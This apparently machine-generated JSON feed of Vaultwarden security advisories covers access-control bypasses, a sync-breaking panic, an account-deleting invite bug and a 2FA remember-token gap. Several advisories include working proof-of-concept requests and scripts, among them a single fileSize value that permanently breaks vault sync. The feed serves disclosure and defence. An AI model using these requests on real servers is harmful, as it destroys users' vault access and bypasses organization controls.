@@ -1,0 +1,2051 @@
+{
+  "schema": "advisorydeck/v1/product-feed",
+  "generated_at": "2026-11-16T02:25:17Z",
+  "product": {
+    "slug": "vaultwarden",
+    "name": "Vaultwarden",
+    "category": "auth",
+    "homepage": "https://github.com/dani-garcia/vaultwarden",
+    "version_scheme": "semver",
+    "branches": []
+  },
+  "advisories": [
+    {
+      "id": "GHSA-7ccc-c43j-4p36",
+      "aliases": [],
+      "title": "Organization member can move personal items into an organization without collection access",
+      "summary": "### Summary\r\n\r\nAn authorization bypass vulnerability in the cipher sharing logic allows non-admin organization members to transfer personal ciphers to an organization without assigning them to a collection. This bypasses collection restrictions and results in \"orphan\" ciphers being injected directly into the organization's root.\r\n\r\n### Details\r\n\r\nIn `src/api/core/ciphers.rs`, the `update_cipher_from_data` function validates whether a user has permission to transfer a cipher to an organization. The authorization check relies on the following condition:\r\n\r\n```rust\r\nif shared_to_collections.as_ref().is_some_and(|cols| !cols.is_empty())\r\n    || member.has_full_access()\r\n    || cipher.is_write_accessible_to_user(&headers.user.uuid, conn).await\r\n\r\n```\r\n\r\nWhen a user shares a personal cipher, `is_write_accessible_to_user` evaluates to `true` because the user is the original owner. This creates a boolean short-circuit, bypassing the requirements that the user must either be an organization admin (`has_full_access`) or specify at least one valid collection (`!cols.is_empty()`).\r\n\r\nAs a result, the backend accepts the transfer payload even if `collectionIds` is empty, converting the cipher into an unassigned/orphan item within the organization.\r\n\r\n### PoC\r\n\r\n1. Log in to the Web Vault as **User A** (a standard, non-admin member of **Organization B**).\r\n2. Create a personal cipher (let's call it **Cipher A1**) and note its ID.\r\n3. Open the browser's Developer Tools (F12) Console and execute the following API request, deliberately leaving the `collectionIds` array empty:\r\n\r\n```\r\n// 1. Target Configuration & JWT\r\nconst JWT_TOKEN = \"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuY...[Truncated]\"; \r\nconst PERSONAL_CIPHER_ID = \"2004fb9e-8180-4909-91fb-c5a23feb20f3\"; \r\nconst TARGET_ORG_ID = \"2004fb9e-1b95-4fab-9604-b9324033b580\"; \r\n\r\n// 2. Audit Payload Construction\r\nconst payload = {\r\n    cipher: {\r\n        type: 1,\r\n        name: \"Audit_Test_Item\",\r\n        organizationId: TARGET_ORG_ID,\r\n        folderId: null,\r\n        login: {\r\n            username: \"audit_test_user\",\r\n            password: \"audit_test_password\"\r\n        }\r\n    },\r\n    // Boundary test: Empty array to verify if backend forces collection association\r\n    collectionIds: [] \r\n};\r\n\r\n// 3. API Execution\r\nfetch(`/api/ciphers/${PERSONAL_CIPHER_ID}/share`, {\r\n    method: 'PUT',\r\n    headers: {\r\n        'Authorization': JWT_TOKEN,\r\n        'Content-Type': 'application/json'\r\n    },\r\n    body: JSON.stringify(payload)\r\n})\r\n.then(async res => {\r\n    if (res.ok) {\r\n        console.warn(\"[Audit Flag] Request succeeded (200 OK). Potential logic flaw:\", await res.json());\r\n    } else {\r\n        console.log(`[Control Active] Request blocked (Status: ${res.status})`);\r\n    }\r\n})\r\n.catch(err => console.error(\"[Audit Error] Execution failed:\", err));\r\n\r\n```\r\n\r\n4. Observe that the API returns `200 OK`. Cipher A1 disappears from User A's personal vault.\r\n5. Log in as **User B** (Owner of Organization B) and navigate to the Organization Vault.\r\n6. The cipher appears under the \"Unassigned\" items, successfully bypassing the collection assignment requirement.\r\n\r\n### Impact\r\n\r\n**Broken Access Control.** Standard users can bypass organizational collection policies to inject unassigned data (orphan ciphers) directly into the organization vault. This leads to data clutter and forces administrators to manually clean up items that violate organization policies.",
+      "published_at": "2026-10-28T18:01:28.000Z",
+      "modified_at": "2026-10-28T18:01:28.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-862"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-7ccc-c43j-4p36",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-7ccc-c43j-4p36",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-7ccc-c43j-4p36",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b4c84c1ee9ce8e793205e4287342d6169899f8d37ad51a3177cce04d29a6b95a",
+      "note": null
+    },
+    {
+      "id": "GHSA-69q9-v8p6-xvx3",
+      "aliases": [],
+      "title": "Revoked or unconfirmed organization member retains read and delete access to organization ciphers",
+      "summary": "## Summary\r\n\r\nRevoking an organization member suspends them in the UI and hides organization items from their\r\nsync, but does not remove the collection and group grants that the per-item authorization checks\r\nrely on. A revoked member who keeps their own account can continue to read organization ciphers\r\none at a time, and can soft-delete and permanently delete them, indefinitely. The item-level checks\r\nnever consult membership status, while the listing queries do.\r\n\r\n## Severity / CVSS\r\n\r\nCVSS 3.1 vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`\r\nBase score: 8.1\r\nSeverity: High\r\n\r\n`PR:L` because the attacker authenticates with their own surviving account, which revocation does\r\nnot disable. `C:H` for continued read access to organization secrets, including secrets rotated in\r\nplace after the revocation. `I:H` for permanent destruction of organization items; editing item\r\ncontents is blocked by a separate check, so this metric covers deletion only. `A:N` because the\r\nservice itself is unaffected.\r\n\r\n## Affected component\r\n\r\n- `src/db/models/cipher.rs`, `Cipher::get_access_restrictions`,\r\n  `get_user_collections_access_flags`, `get_group_collections_access_flags`\r\n- `src/db/models/group.rs`, `Group::is_in_full_access_group`\r\n- `src/api/core/organizations.rs`, `revoke_member_impl`\r\n- `src/api/core/ciphers.rs`, `get_cipher`, `delete_cipher_by_uuid`, `restore_cipher_by_uuid`,\r\n  `delete_cipher_attachment_by_id`\r\n\r\nTested at commit `46ae59eaf444f0ae0a799070cf2bd6c415284a51`, default configuration, sqlite,\r\nmail disabled.\r\n\r\n## Root cause\r\n\r\nRevocation adjusts the status field and saves the row:\r\n\r\n```rust\r\n// organizations.rs:2338, revoke_member_impl\r\nmember.revoke();          // status -= 128\r\nmember.save(conn).await?;\r\n```\r\n\r\n`Membership::save` (`organization.rs:752`) writes the membership row and nothing else. The removal\r\npath, `Membership::delete` (`organization.rs:785`), does tear down the derived grants:\r\n\r\n```rust\r\nCollectionUser::delete_all_by_user_and_org(&self.user_uuid, &self.org_uuid, conn).await?;\r\nGroupUser::delete_all_by_member(&self.uuid, conn).await?;\r\n```\r\n\r\nRevocation performs neither, so the `users_collections` and `groups_users` rows survive.\r\n\r\nThe listing queries compensate by filtering on membership status. `Cipher::find_by_user` joins\r\n`users_organizations` under `status = Confirmed` and then constrains the collection join to that\r\nmembership:\r\n\r\n```rust\r\n// cipher.rs:814-825\r\n.left_join(\r\n    users_organizations::table.on(ciphers::organization_uuid\r\n        .eq(users_organizations::org_uuid.nullable())\r\n        .and(users_organizations::user_uuid.eq(user_uuid))\r\n        .and(users_organizations::status.eq(MembershipStatus::Confirmed as i32))),\r\n)\r\n.left_join(\r\n    users_collections::table.on(ciphers_collections::collection_uuid\r\n        .eq(users_collections::collection_uuid)\r\n        // Ensure that users_collections::user_uuid is NULL for unconfirmed users.\r\n        .and(users_organizations::user_uuid.eq(users_collections::user_uuid))),\r\n)\r\n```\r\n\r\n`Collection::find_by_user_uuid` filters status the same way (`collection.rs:258,295`), and\r\n`Cipher::is_in_full_access_org` goes through `Membership::find_confirmed_by_user_and_org`\r\n(`cipher.rs:566`).\r\n\r\nThe per-item authorization path does not. `get_user_collections_access_flags` joins\r\n`ciphers` to `ciphers_collections` to `users_collections` on `user_uuid` alone and never touches\r\n`users_organizations`, so membership status cannot be considered:\r\n\r\n```rust\r\n// cipher.rs:671-679\r\nciphers::table\r\n    .filter(ciphers::uuid.eq(&self.uuid))\r\n    .inner_join(ciphers_collections::table.on(ciphers::uuid.eq(ciphers_collections::cipher_uuid)))\r\n    .inner_join(\r\n        users_collections::table.on(ciphers_collections::collection_uuid\r\n            .eq(users_collections::collection_uuid)\r\n            .and(users_collections::user_uuid.eq(user_uuid))),\r\n    )\r\n    .select((users_collections::read_only, users_collections::hide_passwords, users_collections::manage...",
+      "published_at": "2026-10-28T18:01:21.000Z",
+      "modified_at": "2026-10-28T18:01:21.000Z",
+      "severity": {
+        "level": "high",
+        "score": 8.1,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-69q9-v8p6-xvx3",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-69q9-v8p6-xvx3",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-69q9-v8p6-xvx3",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:ae4854d07031656fd4885effd1337009fc9cb265976050f2b5ff8f228c5365df",
+      "note": null
+    },
+    {
+      "id": "GHSA-q5x6-grh5-fqgc",
+      "aliases": [],
+      "title": "Unbounded client-declared attachment fileSize causes an out-of-bounds panic that permanently breaks vault sync for every user who can see the cipher",
+      "summary": "### Summary\r\n\r\n`POST /api/ciphers/{id}/attachment/v2` accepts a client-declared `fileSize` and validates only that it is not negative. A value above `1024^6` (~1.15e18, well within `i64`) makes `get_display_size()` index a fixed 6-element array out of bounds and panic.\r\n\r\nThe attachment row is committed to the database **before** the panic, and the operation is not wrapped in a transaction, so the poisoned row persists. Afterwards every endpoint that serialises that cipher - `GET /api/sync`, `GET /api/ciphers`, `GET /api/ciphers/{id}` - panics and returns `500` **permanently**.\r\n\r\nNo file is ever uploaded; the request body is a few hundred bytes.\r\n\r\nIf the poisoned cipher is shared with an organization collection, **every member who can see it - including owners and admins - permanently loses vault sync**. That is a cross-user denial of service triggered by an ordinary member with edit rights.\r\n\r\nConfirmed at runtime against a stock `vaultwarden/server:1.37.1` container.\r\n\r\n### Details\r\n\r\n`src/util.rs:334` - `get_display_size()`:\r\n\r\n```rust\r\npub fn get_display_size(size: i64) -> String {\r\n    const UNITS: [&str; 6] = [\"bytes\", \"KB\", \"MB\", \"GB\", \"TB\", \"PB\"];   // valid indices 0..=5\r\n    ...\r\n    let mut unit_counter = 0;\r\n    loop {\r\n        if size > 1024. { size /= 1024.; unit_counter += 1; } else { break; }\r\n    }\r\n    format!(\"{size:.2} {}\", UNITS[unit_counter])                        // src/util.rs:353 - unchecked index\r\n}\r\n```\r\n\r\nAny value that survives six divisions by 1024 yields `unit_counter == 6` and panics at `src/util.rs:353` (`core::panicking::panic_bounds_check`).\r\n\r\n`src/api/core/ciphers.rs` - the v2 attachment endpoint (guard: plain `Headers`, i.e. any logged-in user):\r\n\r\n```rust\r\nlet file_size = data.file_size.into_i64()?;      // src/api/core/ciphers.rs:1150\r\nif file_size < 0 { ... }                          // :1152 - only a lower bound is checked\r\n...\r\nAttachment::new(attachment_id, cipher.uuid, data.file_name, file_size, Some(data.key));  // :1157 - persisted\r\n```\r\n\r\n`file_size` is a `NumberOrString`, so the full `i64` range is accepted. The storage-quota checks live in the separate upload step, which the attacker simply never performs. The row is saved at `:1157`; the panic then occurs while building the response, so the write is never rolled back.\r\n\r\n`Attachment::to_json` (`src/db/models/attachment.rs:74`) calls `get_display_size(self.file_size)`, and is reached from `Cipher::to_json`, which backs `/api/sync`, `/api/ciphers` and `/api/ciphers/{id}`.\r\n\r\nBecause every listing endpoint panics, the victim cannot discover the attachment id through the API in order to delete it - recovery requires direct database access.\r\n\r\n### PoC\r\n\r\nVerified against a clean `vaultwarden/server:1.37.1` instance:\r\n\r\n```\r\ndocker run -d --name vw -p 127.0.0.1:8089:80 -e SIGNUPS_ALLOWED=true vaultwarden/server:1.37.1\r\n```\r\n\r\n**Variant 1 - single account:**\r\n\r\n```\r\nGET  /api/sync                                  -> 200          (baseline)\r\n\r\nPOST /api/ciphers/{cipher_id}/attachment/v2\r\nAuthorization: Bearer <token>\r\nContent-Type: application/json\r\n\r\n{\"key\":\"2.a|b|c\",\"fileName\":\"2.f|f|f\",\"fileSize\":4611686018427387904,\"adminRequest\":false}\r\n                                                -> 500\r\n\r\nGET  /api/sync                                  -> 500   (permanent)\r\nGET  /api/ciphers                               -> 500   (permanent)\r\nGET  /api/ciphers/{cipher_id}                   -> 500   (permanent)\r\n```\r\n\r\nServer log: `core::panicking::panic_bounds_check`.\r\n\r\n**Variant 2 - organization / cross-user (observed):**\r\n\r\n1. Owner creates an organization and a collection, invites a member with edit rights (`type: 2`, `readOnly: false`), and confirms them.\r\n2. Owner creates a cipher in that collection. Baseline: owner `GET /api/sync` → `200`, member → `200`.\r\n3. The **member** sends the poison request above against the **shared** cipher → `500`.\r\n4. Result:\r\n\r\n```\r\nOWNER   GET /api/sync                 -> 500\r\nMEMBER  GET /api/sync...",
+      "published_at": "2026-10-28T18:01:14.000Z",
+      "modified_at": "2026-10-28T18:01:14.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.5,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-129",
+        "CWE-1284"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-q5x6-grh5-fqgc",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-q5x6-grh5-fqgc",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-q5x6-grh5-fqgc",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b4c84c1ee9ce8e793205e4287342d6169899f8d37ad51a3177cce04d29a6b95a",
+      "note": null
+    },
+    {
+      "id": "GHSA-v576-3wvq-xh3c",
+      "aliases": [],
+      "title": "Loop-carried user_created flag in send_invite deletes a pre-existing user's account and entire vault when an invite e-mail fails",
+      "summary": "### Summary\r\n\r\nIn `send_invite`, the `user_created` flag is declared **outside** the per-e-mail loop and is never reset. Once any iteration creates a shell account for a new address, the flag stays `true` for every later iteration.\r\n\r\nIf a later iteration resolves to a **pre-existing account** and that invite e-mail fails to send, the error handler takes the `user_created` branch and calls `user.delete()` on **that pre-existing user** - destroying their entire account: all ciphers, folders, attachments, Sends, devices, 2FA registrations, emergency-access grants and organization memberships. There is no transaction, so the deletion persists even though the request returns `500`/`400`.\r\n\r\nAn authenticated attacker can trigger this deliberately (organization creation is open by default, so any registered user can become an Owner of their own organization and invite arbitrary addresses). It also fires **accidentally**: an administrator inviting `[new user, existing user]` whose second message is rejected by the mail relay - greylisting, rate limiting, a full mailbox, a size limit - silently destroys the existing user's vault.\r\n\r\nVerified end-to-end against a stock `vaultwarden/server:1.37.1` container.\r\n\r\n### Details\r\n\r\n`src/api/core/organizations.rs`:\r\n\r\n```rust\r\nlet mut user_created: bool = false;                       // :1078 - OUTSIDE the loop\r\nfor email in &data.emails {                               // :1079\r\n    let user = match User::find_by_mail(email, &conn).await {\r\n        None => {                                         // address has no account\r\n            ...\r\n            let mut new_user = User::new(email, None);\r\n            new_user.save(&conn).await?;\r\n            user_created = true;                          // :1097 - set, never reset\r\n            new_user\r\n        }\r\n        Some(user) => {                                   // :1100 - a PRE-EXISTING account\r\n            if Membership::find_by_user_and_org(...).is_some() {\r\n                err!(format!(\"User already in organization: {email}\"))\r\n            }\r\n            ...\r\n            user\r\n        }\r\n    };\r\n    ...\r\n    if CONFIG.mail_enabled() {\r\n        ...\r\n        if let Err(e) = mail::send_invite(&user, ...).await {\r\n            // Upon error delete the user, invite and org member records when needed\r\n            if user_created {                             // :1140 - still true from an earlier iteration\r\n                user.delete(&conn).await?;                // :1141 - deletes THIS iteration's user\r\n            } else {\r\n                new_member.delete(&conn).await?;          // the correct action\r\n            }\r\n            err!(format!(\"Error sending invite: {e:?} \"));\r\n        }\r\n    }\r\n```\r\n\r\nThe intent of `:1140-1144` is clearly \"if I just created this shell account, roll it back; otherwise only remove the membership\". Because the flag is loop-carried rather than per-iteration, the rollback is applied to a user the handler did **not** create.\r\n\r\n`User::delete` (`src/db/models/user.rs:341-366`) removes Sends, emergency-access grants (both as grantor and by grantee e-mail), every membership, every cipher, favorites, folders, devices, 2FA registrations, and finally the `users` row. The handler runs no transaction (Vaultwarden does not wrap these handlers), so the deletion is committed before the error response is produced.\r\n\r\n`mail::send_invite` returns `Err` for both transient and permanent relay responses (`src/mail.rs`), so any 4xx or 5xx from the MTA - greylisting, rate limit, mailbox full, message too big, sendmail non-zero exit - reaches this branch.\r\n\r\n### PoC\r\n\r\nStock 1.37.1 with SMTP configured. For a deterministic lab, point `SMTP_HOST` at a small sink that answers `250` for every recipient **except** the victim's address (this models a bouncing/greylisted victim mailbox):\r\n\r\n```\r\ndocker run -d --name vw -p 127.0.0.1:8091:80 \\\r\n  -e SIGNUPS_ALLOWED=true \\\r\n  -e SMTP_HOST=<sink-ip> -e SMTP_PORT=2526 -e SMTP_SECURITY=off \\\r\n  -...",
+      "published_at": "2026-10-28T18:01:07.000Z",
+      "modified_at": "2026-10-28T18:01:07.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.8,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:H",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-459",
+        "CWE-670",
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "1.33.0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v576-3wvq-xh3c",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-v576-3wvq-xh3c",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-v576-3wvq-xh3c",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:95102e3a5339128949c21bb4e41b09fad0f6eeb118362925c08ff126e7e21d79",
+      "note": null
+    },
+    {
+      "id": "GHSA-64mc-4p6f-r7x9",
+      "aliases": [],
+      "title": "Revoked or unconfirmed organization Admin can read cipher audit logs",
+      "summary": "## Summary\r\n\r\n`GET /api/ciphers/<cipher_id>/events` returns an organization cipher's audit log to any\r\nauthenticated user whose membership row carries `atype` Owner or Admin, **regardless of\r\nmembership status**. A member who was invited but never confirmed, or who was confirmed and\r\nlater revoked, keeps indefinite read access to that cipher's access history: who viewed,\r\nedited, copied or autofilled the credential, when, from which IP and device type.\r\n\r\nThe two sibling event endpoints in the same file are guarded correctly. This one is not.\r\n\r\nRequires `ORG_EVENTS_ENABLED=true`, which is not the default.\r\n\r\n## Affected\r\n\r\n1.37.3 (current release) and `main` at commit `25dfedaf` (2026-09-09). Verified on both.\r\n\r\n## Root cause\r\n\r\n`src/api/core/events.rs` has three event endpoints. Two require `AdminHeaders`:\r\n\r\n```rust\r\n:34  async fn get_org_events(..., headers: AdminHeaders, ...)      // organization events\r\n:92  async fn get_user_events(..., headers: AdminHeaders, ...)     // per member events\r\n:66  async fn get_cipher_events(..., headers: Headers, ...)        // per cipher events\r\n```\r\n\r\n`AdminHeaders` resolves through `is_confirmed_and_admin()` at `src/auth.rs:725`:\r\n\r\n```rust\r\nfn is_confirmed_and_admin(&self) -> bool {\r\n    self.membership_status == MembershipStatus::Confirmed && self.membership_type >= MembershipType::Admin\r\n}\r\n```\r\n\r\n`get_cipher_events` instead takes the generic `Headers` guard, which only proves a valid user\r\nJWT, and hand rolls its own check via `Membership::user_has_ge_admin_access_to_cipher` at\r\n`src/db/models/organization.rs:1105`:\r\n\r\n```rust\r\nusers_organizations::table\r\n    .inner_join(ciphers::table.on(ciphers::uuid.eq(cipher_uuid)\r\n        .and(ciphers::organization_uuid.eq(users_organizations::org_uuid.nullable()))))\r\n    .filter(users_organizations::user_uuid.eq(user_uuid))\r\n    .filter(users_organizations::atype.eq_any(vec![MembershipType::Owner as i32,\r\n                                                   MembershipType::Admin as i32]))\r\n```\r\n\r\nThat reproduces the `membership_type >= Admin` half of `is_confirmed_and_admin` and drops the\r\n`membership_status == Confirmed` half.\r\n\r\nEvery other membership query in `organization.rs` states the invariant in its own name and\r\nenforces it: `find_confirmed_by_user`, `find_confirmed_by_user_and_org`, `find_confirmed_by_org`,\r\n`find_confirmed_and_manage_all_by_org`, `count_confirmed_by_org_and_type`,\r\n`find_by_user_and_policy`. The one function that deliberately omits it is named\r\n`find_any_state_by_user`. `user_has_ge_admin_access_to_cipher` omits it without saying so.\r\n\r\nUpstream Bitwarden gates the equivalent endpoint with the same check it uses for organization\r\nevents (`src/Api/Dirt/Controllers/EventsController.cs`, `AccessEventLogs`). The comment at\r\n`src/api/core/events.rs:32` cites that controller as the reference implementation.\r\n\r\n## Steps to Reproduce\r\n\r\n```\r\ndocker run -d --name vw-repro \\\r\n  -e ORG_EVENTS_ENABLED=true -e SIGNUPS_ALLOWED=true \\\r\n  -e I_REALLY_WANT_VOLATILE_STORAGE=true -e ROCKET_PORT=8080 \\\r\n  -p 127.0.0.1:8081:8080 vaultwarden/server:1.37.3\r\n```\r\n\r\n`repro.py` in the attached archive runs both variants end to end and prints a verdict. It needs\r\nonly the `cryptography` package.\r\n\r\n### Variant 1, never confirmed invitee\r\n\r\n1. Alice creates an organization and a cipher in it, then views it once.\r\n2. Alice invites Bob with `type: 1` (Admin). With SMTP disabled his membership is\r\n   `type=1, status=1` (Accepted). He has never been confirmed and holds no organization key.\r\n3. Bob requests the cipher itself: `GET /api/ciphers/<cipher_id>` returns **HTTP 400**.\r\n4. Bob requests its audit log: `GET /api/ciphers/<cipher_id>/events?start=...&end=...`\r\n   returns **HTTP 200 with the event list**.\r\n\r\nObserved:\r\n\r\n```\r\nBob membership: type=1 status=1  (Accepted, never confirmed, holds no org key)\r\nGET /api/ciphers/{id}          -> HTTP 400   (cipher itself denied)\r\nGET /api/ciphers/{id}/events   -> HTTP 200, 1 events\r\n```\r\n\r\n### Varian...",
+      "published_at": "2026-10-28T18:00:44.000Z",
+      "modified_at": "2026-10-28T18:00:44.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-64mc-4p6f-r7x9",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-64mc-4p6f-r7x9",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-64mc-4p6f-r7x9",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:b4c84c1ee9ce8e793205e4287342d6169899f8d37ad51a3177cce04d29a6b95a",
+      "note": null
+    },
+    {
+      "id": "GHSA-qwx4-wcv4-mpcv",
+      "aliases": [],
+      "title": "Organization Admin can revoke and delete Owners through an Admin-mintable organization API key",
+      "summary": "### Summary\r\n\r\nA confirmed organization Admin can revoke and permanently delete Owners and fellow Admins. The ordinary member removal route refuses exactly this, by name, with \"Only Owners can delete Admins or Owners\". The Admin instead creates the organization API key, which is guarded at Admin level where upstream requires Owner, and drives the public import endpoint, which applies no caller role check and does not exclude Owners.\r\n\r\n### Details\r\n\r\nTwo independent divergences from upstream combine. Either one alone is defensible design.\r\n\r\n`api_key()` in `src/api/core/organizations.rs` is guarded by `AdminHeaders`. Upstream gates the equivalent default key type on Owner in `HasApiKeyAccessAsync`, and `OrganizationClientProvider` accepts only that key type for the `client_credentials` grant.\r\n\r\n`ldap_import` in `src/api/core/public.rs` protects only the last confirmed Owner, via `count_confirmed_by_org_and_type(&org_id, MembershipType::Owner, &conn) <= 1`. Upstream excludes Owners from removal entirely, in both removal branches of `ImportOrganizationUsersAndGroupsCommand.cs`.\r\n\r\nThe minted token carries scope `api.organization` and no user identity, so the import endpoint cannot tell which member created the key.\r\n\r\n### PoC\r\n\r\nOrganization with confirmed Owners A and C, and confirmed Admins B and D.\r\n\r\nStep 1. As Admin B, `POST /api/organizations/<org_id>/api-key` with B's master password. Returns 200 with the key. A plain User and a Manager both receive 401.\r\n\r\nStep 2. As Admin B, remove Owner C through the ordinary member route. Returns 400, \"Only Owners can delete Admins or Owners\".\r\n\r\nStep 3. Exchange the key at `POST /identity/connect/token` with `grant_type=client_credentials` and `scope=api.organization`.\r\n\r\nStep 4. `POST /api/public/organization/import` marking C deleted. Returns 200 and C is revoked.\r\n\r\nStep 5. The same call with `overwriteExisting` set true, omitting C and D from the member list, deletes both from the organization.\r\n\r\nReproduced against a local instance on 1.37.3. The affected code is byte identical on current `main`.\r\n\r\n### Impact\r\n\r\nCWE-863. A confirmed organization Admin gains destructive control over Owners and fellow Admins. The credential is scoped to the organization rather than to the member, so it keeps working after the Admin who created it is removed, and the creation route writes no event log entry.\r\n\r\nThere is no confidentiality impact, because an Admin already exports every organization cipher through a route at the same guard level. The last confirmed Owner is protected, so an organization cannot be fully decapitated. The Admin cannot elevate their own role, and the import creates only ordinary members. A surviving Owner can reverse the removals by re-inviting, and can rotate the key.",
+      "published_at": "2026-10-28T18:00:28.000Z",
+      "modified_at": "2026-10-28T18:00:28.000Z",
+      "severity": {
+        "level": "low",
+        "score": 3.8,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.4"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-qwx4-wcv4-mpcv",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-qwx4-wcv4-mpcv",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-qwx4-wcv4-mpcv",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:c467106b684e833766e3b40fae9e2837426b07eb3ffc7efa5fa0c6da14be8784",
+      "note": null
+    },
+    {
+      "id": "GHSA-7jg8-8m5x-6j9r",
+      "aliases": [],
+      "title": "vaultwarden: device-level 2FA \"remember\" tokens survive admin-initiated 2FA removal, allowing 2FA bypass for up to 30 days (residual gap in fix f1ff613)",
+      "summary": "## Summary\r\n\r\nCommit `f1ff613` (\"revoke 2FA remember tokens when credentials or 2FA change\", released in 1.37.3) established that whenever a user's second factors change, every device's 30-day `twofactor_remember` token must be revoked. The fix covered the user self-service paths, the recovery-code path, and the security-stamp rotation chain - but missed the two administrative remediation paths that strip a user's second factor:\r\n\r\n- the admin panel endpoint `POST /admin/users/<user_id>/remove-2fa` (`src/api/admin.rs:508-514`), and\r\n- organization account recovery with `resetTwoFactor=true` but `resetMasterPassword=false` (`src/api/core/organizations.rs:3072-3077`) - the standard \"the attacker enabled their own 2FA on the victim's account, remove it\" response flow.\r\n\r\nAfter either remediation runs and the victim re-enrolls a brand-new second factor, a device holding a stale remember token still skips 2FA entirely: we reproduce at runtime against the official `vaultwarden/server:latest` image (1.37.3) that the same device which captured a remember token before the remediation logs in with HTTP 200 and receives an `access_token` while the new TOTP is active - and that the identical token is rejected (400) once a *covered* path (password change) fires, isolating the residual exactly. All released versions, including 1.37.3, and current main are affected.\r\n\r\n## Details\r\n\r\nCode locations (master `061694d0`; identical at tag 1.37.3 unless noted):\r\n\r\n- Background - the audited fix: `f1ff613` (2026-09-08, released 1.37.3) added `Device::clear_twofactor_remember_by_user` calls to: user self-disable of a 2FA provider (`src/api/core/two_factor/mod.rs:154`), recovery-code login that deletes all 2FA (`src/api/identity.rs:907-912`), and the security-stamp rotation chain (`src/db/models/device.rs:266-273`, `rotate_refresh_tokens_by_user`).\r\n\r\n- Residual gap A: `src/api/admin.rs:507-514` - `remove_2fa` calls `TwoFactor::delete_all_by_user(...)` and clears `user.totp_recover`, but never calls `Device::clear_twofactor_remember_by_user`:\r\n\r\n  